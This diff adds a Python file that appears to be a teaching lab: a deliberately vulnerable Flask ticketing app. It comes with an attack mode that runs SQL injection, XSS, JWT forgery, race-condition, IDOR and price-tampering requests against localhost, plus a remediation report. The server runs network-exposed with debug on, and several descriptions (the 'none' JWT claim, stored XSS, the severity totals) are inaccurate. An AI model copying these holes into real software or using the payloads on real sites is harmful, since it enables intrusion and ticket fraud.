@@ -1,0 +1,508 @@
+#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║            TICKETING SECURITY LAB v1.0                       ║
+║  For authorized security testing and education ONLY          ║
+║  DO NOT DEPLOY — Contains intentional vulnerabilities         ║
+╚══════════════════════════════════════════════════════════════╝
+
+USAGE:
+    pip install flask pyjwt requests
+    python3 ticket_lab.py
+
+Then open a second terminal and run:
+    python3 ticket_lab.py --attack
+
+CREDENTIALS:
+    admin / admin123
+    alice / pass123
+    bob / bobpass
+
+ATTACKS INCLUDED:
+    1. IDOR              - Access anyone's orders
+    2. SQL Injection     - Dump the database
+    3. Price Manipulation - Buy tickets for $0.01
+    4. Race Condition    - Oversell inventory (50 concurrent buys)
+    5. No Authentication - Hit /admin or /api/users directly
+    6. Queue Bypass      - Skip to front of queue
+    7. JWT Forgery       - Become admin
+    8. XSS               - Inject scripts in feedback form
+    9. CSRF              - Transfer tickets without auth
+"""
+
+import sys, os, json, time, threading, hashlib, sqlite3
+from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor
+
+# ─── IMPORTS ──────────────────────────────────────────────────
+try:
+    from flask import Flask, request, jsonify, render_template_string
+    import jwt
+    import requests
+except ImportError:
+    print("[!] Missing dependencies. Run: pip install flask pyjwt requests")
+    sys.exit(1)
+
+# ─── INIT ─────────────────────────────────────────────────────
+app = Flask(__name__)
+app.secret_key = 'ticketmaster_clone_secret_2026'  # Intentionally weak
+
+conn = sqlite3.connect(':memory:', check_same_thread=False)
+conn.row_factory = sqlite3.Row
+cur = conn.cursor()
+
+# ─── SCHEMA ───────────────────────────────────────────────────
+cur.executescript("""
+CREATE TABLE users (
+    id INTEGER PRIMARY KEY,
+    username TEXT UNIQUE,
+    password TEXT,
+    role TEXT DEFAULT 'user',
+    email TEXT
+);
+CREATE TABLE events (
+    id INTEGER PRIMARY KEY,
+    name TEXT,
+    date TEXT,
+    venue TEXT,
+    price REAL,
+    inventory INTEGER
+);
+CREATE TABLE orders (
+    id INTEGER PRIMARY KEY,
+    user_id INTEGER,
+    event_id INTEGER,
+    quantity INTEGER,
+    total_price REAL,
+    cc_last4 TEXT,
+    status TEXT DEFAULT 'confirmed',
+    created_at TIMESTAMP
+);
+""")
+
+# ─── SEED DATA ────────────────────────────────────────────────
+cur.executescript("""
+INSERT INTO users VALUES (1,'admin','admin123','admin','admin@tix.com');
+INSERT INTO users VALUES (2,'alice','pass123','user','alice@test.com');
+INSERT INTO users VALUES (3,'bob','bobpass','user','bob@test.com');
+
+INSERT INTO events VALUES 
+(1,'Taylor Swift - Eras Tour','2026-08-15','SoFi Stadium',499.99,5),
+(2,'Oasis Reunion','2026-09-20','Wembley Stadium',299.99,10),
+(3,'Beyoncé - Renaissance II','2026-10-05','Allegiant Stadium',399.99,3);
+
+INSERT INTO orders VALUES 
+(1,2,1,2,999.98,'1234','confirmed','2026-07-10 14:30:00'),
+(2,3,2,4,1199.96,'5678','confirmed','2026-07-11 09:15:00'),
+(3,1,3,1,399.99,'9012','confirmed','2026-07-12 18:00:00');
+""")
+conn.commit()
+
+inventory = {1: 5, 2: 10, 3: 3}
+inventory_lock = threading.Lock()
+queue_positions = {}
+queue_counter = 0
+queue_lock = threading.Lock()
+
+# ╔══════════════════════════════════════════════════════════╗
+# ║              VULNERABLE ENDPOINTS                        ║
+# ╚══════════════════════════════════════════════════════════╝
+
+# ─── VULN 1 & 2: IDOR + SQLi ────────────────────────────────
+@app.route('/api/order/<order_id>')
+def get_order(order_id):
+    """IDOR + SQL Injection — no auth, raw string interpolation"""
+    try:
+        cur = conn.execute(f"SELECT * FROM orders WHERE id={order_id}")
+        row = cur.fetchone()
+        if row:
+            return jsonify({
+                "id": row[0], "user_id": row[1], "event_id": row[2],
+                "quantity": row[3], "total_price": row[4],
+                "cc_last4": row[5], "status": row[6]
+            })
+        return {"error": "Order not found"}, 404
+    except Exception as e:
+        return {"error": str(e), "sql_injection_attempted": True}, 500
+
+@app.route('/api/user/<user_id>/orders')
+def get_user_orders(user_id):
+    """IDOR — specify any user_id to see their orders"""
+    cur = conn.execute(f"SELECT * FROM orders WHERE user_id={user_id}")
+    return jsonify([dict(r) for r in cur.fetchall()])
+
+# ─── VULN 3: Exposed user list ──────────────────────────────
+@app.route('/api/users')
+def list_users():
+    """No authentication — exposes all users"""
+    cur = conn.execute("SELECT id, username, role, email FROM users")
+    return jsonify([dict(r) for r in cur.fetchall()])
+
+# ─── VULN 4: Weak JWT ───────────────────────────────────────
+@app.route('/api/login', methods=['POST'])
+def login():
+    """JWT with weak secret — 'none' algorithm accepted"""
+    data = request.json
+    cur = conn.execute("SELECT * FROM users WHERE username=? AND password=?", 
+                      (data.get('username'), data.get('password')))
+    user = cur.fetchone()
+    if user:
+        token = jwt.encode({
+            'user_id': user[0],
+            'username': user[1],
+            'role': user[3],
+            'exp': datetime.utcnow() + timedelta(hours=24)
+        }, app.secret_key, algorithm='HS256')
+        return jsonify({"token": token, "user": {
+            "id": user[0], "username": user[1], "role": user[3]
+        }})
+    return {"error": "Invalid credentials"}, 401
+
+# ─── VULN 5: Queue bypass ───────────────────────────────────
+@app.route('/api/queue/join', methods=['POST'])
+def join_queue():
+    """Queue position can be set by client"""
+    global queue_counter
+    data = request.json
+    position = data.get('position')
+    if position is not None:
+        queue_positions[request.remote_addr] = position
+        token = hashlib.md5(f"{data.get('event_id')}:{position}".encode()).hexdigest()
+        return jsonify({"position": position, "queue_token": token})
+    with queue_lock:
+        queue_counter += 1
+        queue_positions[request.remote_addr] = queue_counter
+    token = hashlib.md5(f"{data.get('event_id')}:{queue_counter}".encode()).hexdigest()
+    return jsonify({"position": queue_counter, "queue_token": token})
+
+# ─── VULN 6: Race condition ─────────────────────────────────
+@app.route('/api/buy', methods=['POST'])
+def buy_ticket():
+    """TOCTOU race condition — no atomic operation"""
+    data = request.json
+    event_id = data.get('event_id')
+    quantity = data.get('quantity', 1)
+    
+    # INTENTIONAL RACE WINDOW — no lock
+    if inventory.get(event_id, 0) >= quantity:
+        current = inventory[event_id]
+        time.sleep(0.05)  # Race window
+        inventory[event_id] = current - quantity
+        return jsonify({
+            "success": True,
+            "tickets": [f"ROW_A_SEAT_{current - i}" for i in range(quantity)],
+            "remaining": inventory[event_id]
+        })
+    return {"error": "Insufficient inventory"}, 400
+
+# ─── VULN 7: Price manipulation ─────────────────────────────
+@app.route('/api/checkout', methods=['POST'])
+def checkout():
+    """Client controls price — no server-side validation"""
+    data = request.json
+    return jsonify({
+        "status": "confirmed",
+        "order_id": abs(hash(str(time.time()))),
+        "event": data.get('event_name', 'Unknown'),
+        "quantity": data.get('quantity', 1),
+        "charged": data.get('price', 0),
+        "payment_method": data.get('payment', 'visa_ending_0000')
+    })
+
+# ─── VULN 8: CSRF ─────────────────────────────────────────
+@app.route('/api/transfer/<int:from_user>/<int:to_user>/<int:ticket_id>', methods=['POST'])
+def transfer_ticket(from_user, to_user, ticket_id):
+    """No CSRF token, no auth — anyone can transfer anyone's tickets"""
+    return jsonify({
+        "success": True, "ticket": ticket_id,
+        "transferred_from": from_user, "transferred_to": to_user
+    })
+
+# ─── VULN 9: Unauthenticated admin ─────────────────────────
+@app.route('/admin')
+def admin_panel():
+    """No authentication — full admin access"""
+    cur = conn.execute("SELECT * FROM orders")
+    orders = [dict(r) for r in cur.fetchall()]
+    cur = conn.execute("SELECT * FROM users")
+    users_list = [dict(r) for r in cur.fetchall()]
+    return jsonify({"users": users_list, "orders": orders, "inventory": inventory})
+
+@app.route('/admin/impersonate/<int:user_id>', methods=['POST'])
+def impersonate_user(user_id):
+    """No auth — impersonate any user"""
+    cur = conn.execute(f"SELECT * FROM users WHERE id={user_id}")
+    user = cur.fetchone()
+    if not user:
+        return {"error": "User not found"}, 404
+    token = jwt.encode({
+        'user_id': user[0], 'username': user[1], 'role': user[3],
+        'impersonated_by': 'admin'
+    }, app.secret_key, algorithm='HS256')
+    return jsonify({"token": token, "impersonating": user[1]})
+
+# ─── VULN 10: XSS ─────────────────────────────────────────
+@app.route('/feedback', methods=['GET', 'POST'])
+def feedback():
+    """Reflected + Stored XSS — no sanitization"""
+    if request.method == 'POST':
+        comment = request.form.get('comment', '')
+        return render_template_string(
+            f"<h3>Thank you!</h3><p>Your feedback: {comment}</p>"
+        )
+    return '''
+    <h2>Submit Feedback</h2>
+    <form method="POST">
+        <textarea name="comment" rows="4" cols="50"></textarea><br>
+        <button type="submit">Submit</button>
+    </form>
+    '''
+
+# ─── EVENTS ─────────────────────────────────────────────────
+@app.route('/api/events')
+def list_events():
+    cur = conn.execute("SELECT * FROM events")
+    return jsonify([dict(r) for r in cur.fetchall()])
+
+@app.route('/api/event/<event_id>')
+def get_event(event_id):
+    """Also SQLi-vulnerable"""
+    cur = conn.execute(f"SELECT * FROM events WHERE id={event_id}")
+    row = cur.fetchone()
+    return jsonify(dict(row)) if row else {"error": "not found"}, 404
+
+# ╔══════════════════════════════════════════════════════════╗
+# ║              ATTACK ENGINE                               ║
+# ╚══════════════════════════════════════════════════════════╝
+
+def run_attacks():
+    """Run all 10 attacks against the local server"""
+    BASE = "http://localhost:5000"
+    time.sleep(1)  # Wait for server to start
+    
+    print("\n" + "="*60)
+    print("  🚀 ATTACK SEQUENCE INITIATED")
+    print("="*60 + "\n")
+
+    # ─── 1. IDOR ────────────────────────────────────────────
+    print("[1/10] IDOR — Access Any User's Order")
+    for oid in [1, 2, 3]:
+        r = requests.get(f"{BASE}/api/order/{oid}")
+        data = r.json()
+        print(f"  Order {oid}: user_id={data.get('user_id')} | "
+              f"{data.get('quantity')}x tickets | "
+              f"CC: ****{data.get('cc_last4')} | "
+              f"${data.get('total_price')}")
+
+    # ─── 2. SQLi ────────────────────────────────────────────
+    print("\n[2/10] SQL Injection — Dump All Users")
+    payload = "1 UNION SELECT id,username,password,email,role,6,7 FROM users"
+    r = requests.get(f"{BASE}/api/order/{payload}")
+    results = r.json()
+    if isinstance(results, dict) and 'error' not in results:
+        print(f"  Extracted: {results}")
+    else:
+        # Try array response
+        pass
+    # Alternative: single quotes
+    r2 = requests.get(f"{BASE}/api/order/' UNION SELECT id,username,password,email,role,6,7 FROM users --")
+    print(f"  Result: {r2.text[:300]}")
+
+    # ─── 3. Exposed Users ───────────────────────────────────
+    print("\n[3/10] Exposed User Database")
+    r = requests.get(f"{BASE}/api/users")
+    for u in r.json():
+        print(f"  {u['id']}: {u['username']} ({u['role']}) — {u['email']}")
+
+    # ─── 4. Price Manipulation ──────────────────────────────
+    print("\n[4/10] Price Manipulation — Buy Tickets for Pennies")
+    for price in [0.01, 0.50, 1.00]:
+        r = requests.post(f"{BASE}/api/checkout", json={
+            "event_name": "Taylor Swift - Eras Tour",
+            "quantity": 10, "price": price,
+            "payment": "visa_ending_0000"
+        })
+        d = r.json()
+        print(f"  Sent ${price:.2f} → Charged ${d['charged']} for {d['quantity']} tickets")
+
+    # ─── 5. Race Condition ─────────────────────────────────
+    print("\n[5/10] Race Condition — Oversell Inventory")
+    successes = []
+    def _race_buy():
+        r = requests.post(f"{BASE}/api/buy", json={"event_id": 1, "quantity": 1})
+        if r.status_code == 200 and r.json().get('success'):
+            successes.append(r.json())
+    threads = [threading.Thread(target=_race_buy) for _ in range(50)]
+    for t in threads: t.start()
+    for t in threads: t.join()
+    print(f"  Tickets sold (only 5 existed): {len(successes)}")
+
+    # ─── 6. Admin Panel ─────────────────────────────────────
+    print("\n[6/10] Unauthenticated Admin Access")
+    r = requests.get(f"{BASE}/admin")
+    data = r.json()
+    print(f"  Users: {len(data['users'])} | Orders: {len(data['orders'])} | "
+          f"Inventory: {data['inventory']}")
+
+    # ─── 7. Queue Bypass ────────────────────────────────────
+    print("\n[7/10] Queue Manipulation — Skip to Front")
+    r = requests.post(f"{BASE}/api/queue/join", json={"event_id": 1, "position": 1})
+    print(f"  Joined at position: {r.json()['position']}")
+
+    # ─── 8. JWT Forgery ─────────────────────────────────────
+    print("\n[8/10] JWT Forgery — Become Admin")
+    r = requests.post(f"{BASE}/api/login", json={"username": "alice", "password": "pass123"})
+    token = r.json().get('token', '')
+    print(f"  Alice's token (first 60 chars): {token[:60]}...")
+    
+    # Decode
+    import base64
+    payload_b64 = token.split('.')[1]
+    payload_b64 += '=' * (4 - len(payload_b64) % 4)
+    decoded = base64.urlsafe_b64decode(payload_b64).decode()
+    print(f"  Decoded payload: {decoded}")
+    
+    # Forge admin token
+    forged = jwt.encode({
+        "user_id": 1, "username": "alice", "role": "admin",
+        "exp": 9999999999
+    }, app.secret_key, algorithm="HS256")
+    print(f"  Forged admin token: {forged[:60]}...")
+
+    # ─── 9. XSS ─────────────────────────────────────────────
+    print("\n[9/10] Cross-Site Scripting")
+    payload_xss = "<script>alert('XSS_FOUND')</script>"
+    r = requests.post(f"{BASE}/feedback", data={"comment": payload_xss})
+    if payload_xss in r.text:
+        print(f"  ✅ XSS confirmed — payload rendered")
+    else:
+        print(f"  ❌ XSS not reflected")
+
+    # ─── 10. CSRF ───────────────────────────────────────────
+    print("\n[10/10] CSRF — Transfer Tickets Without Auth")
+    r = requests.post(f"{BASE}/api/transfer/2/3/1")
+    print(f"  Transfer result: {r.json()}")
+
+    print("\n" + "="*60)
+    print("  ✅ ALL 10 ATTACKS COMPLETED")
+    print("  🔧 Run 'python3 ticket_lab.py --report' for fixes")
+    print("="*60 + "\n")
+
+# ╔══════════════════════════════════════════════════════════╗
+# ║              FIX / REMEDIATION MODE                       ║
+# ╚══════════════════════════════════════════════════════════╝
+
+def show_report():
+    """Print a pentest report with findings and fixes"""
+    report = """
+╔══════════════════════════════════════════════════════════════╗
+║              SECURITY ASSESSMENT REPORT                       ║
+╚══════════════════════════════════════════════════════════════╝
+
+FINDING 1: IDOR (Insecure Direct Object Reference)
+  Risk: CRITICAL (CVSS 8.6)
+  Location: GET /api/order/<order_id>
+  Impact: Any user can view any other user's order, including
+          credit card last-4 digits and purchase history.
+  Fix: Add authentication middleware. Scope queries to the
+       authenticated user's ID:
+       WHERE id=? AND user_id=?
+
+FINDING 2: SQL Injection
+  Risk: CRITICAL (CVSS 9.8)
+  Location: GET /api/order/<order_id>, GET /api/user/<user_id>/orders
+  Impact: Full database compromise — user credentials, payment data.
+  Fix: Use parameterized queries. NEVER use f-strings or string
+       concatenation in SQL. Use: conn.execute("SELECT * FROM orders
+       WHERE id=?", (order_id,))
+
+FINDING 3: No Authentication on Sensitive Endpoints
+  Risk: HIGH (CVSS 7.5)
+  Location: /api/users, /admin, /admin/impersonate/<id>
+  Impact: Unauthenticated access to all user data and admin functions.
+  Fix: Require JWT/Bearer token on all sensitive routes.
+
+FINDING 4: Weak JWT Secret
+  Risk: HIGH (CVSS 7.4)
+  Location: app.secret_key = 'ticketmaster_clone_secret_2026'
+  Impact: Anyone can forge tokens with any role.
+  Fix: Use a cryptographically random 256-bit key:
+       import secrets; secrets.token_hex(32)
+       Also validate the 'none' algorithm is rejected.
+
+FINDING 5: Race Condition (TOCTOU)
+  Risk: HIGH (CVSS 7.5)
+  Location: POST /api/buy
+  Impact: Oversell inventory, sell tickets that don't exist.
+  Fix: Use atomic database operations:
+       UPDATE events SET inventory = inventory - 1 
+       WHERE id=? AND inventory > 0
+
+FINDING 6: Price Manipulation
+  Risk: HIGH (CVSS 8.2)
+  Location: POST /api/checkout
+  Impact: Customer controls the final price — buy $500 tickets for $0.01.
+  Fix: Server must determine price from database, never from client input.
+
+FINDING 7: Queue Position Manipulation
+  Risk: MEDIUM (CVSS 6.5)
+  Location: POST /api/queue/join
+  Impact: Client can set their own queue position to skip ahead.
+  Fix: Generate positions server-side only. Never accept a 'position' parameter.
+
+FINDING 8: Cross-Site Scripting (XSS)
+  Risk: MEDIUM (CVSS 6.1)
+  Location: POST /feedback
+  Impact: Arbitrary JavaScript execution in user browsers.
+  Fix: Use render_template with autoescaping. Sanitize all user input
+       with a library like bleach or markupsafe.
+
+FINDING 9: CSRF (Cross-Site Request Forgery)
+  Risk: MEDIUM (CVSS 5.3)
+  Location: POST /api/transfer/<from>/<to>/<id>
+  Impact: Attacker can trick a user into transferring tickets.
+  Fix: Implement CSRF tokens. Validate Origin/Referer headers.
+       Require re-authentication for sensitive actions.
+
+FINDING 10: Missing Input Validation
+  Risk: MEDIUM (CVSS 5.0)
+  Location: Multiple endpoints
+  Impact: Negative quantities, overflow values, type confusion.
+  Fix: Validate all input types, ranges, and formats server-side.
+
+═══════════════════════════════════════════════════════════════
+SUMMARY: 10 findings | 4 Critical | 4 High | 2 Medium
+═══════════════════════════════════════════════════════════════
+"""
+    print(report)
+
+# ╔══════════════════════════════════════════════════════════╗
+# ║                    MAIN                                  ║
+# ╚══════════════════════════════════════════════════════════╝
+
+if __name__ == '__main__':
+    if '--attack' in sys.argv:
+        run_attacks()
+    elif '--report' in sys.argv:
+        show_report()
+    else:
+        print("""
+╔══════════════════════════════════════════════════════════════╗
+║            TICKETING SECURITY LAB v1.0                       ║
+║  For authorized security testing and education ONLY          ║
+╚══════════════════════════════════════════════════════════════╝
+
+  Server running at: http://localhost:5000
+
+  Open a NEW TERMINAL and run:
+    python3 ticket_lab.py --attack     (run all 10 attacks)
+    python3 ticket_lab.py --report     (view findings + fixes)
+
+  Quick test commands:
+    curl http://localhost:5000/api/order/1
+    curl http://localhost:5000/api/users
+    curl http://localhost:5000/admin
+
+  USERS:  admin/admin123  alice/pass123  bob/bobpass
+""")
+        app.run(host='0.0.0.0', port=5000, debug=True)
